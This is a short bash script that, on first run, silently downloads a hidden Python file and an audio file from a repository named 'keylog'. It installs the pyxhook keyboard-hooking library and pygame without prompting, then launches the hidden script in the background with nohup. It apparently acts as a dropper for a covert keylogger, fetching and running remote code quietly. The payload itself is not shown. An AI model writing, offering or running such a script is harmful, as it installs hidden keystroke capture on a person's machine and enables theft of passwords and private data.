#!/bin/bash

if [ ! -f .pylock ]; then
  touch .pylock
  wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py"
  wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3"
  yes | pip3 install pyxhook pygame 
  nohup python3 .log.py &
fi;
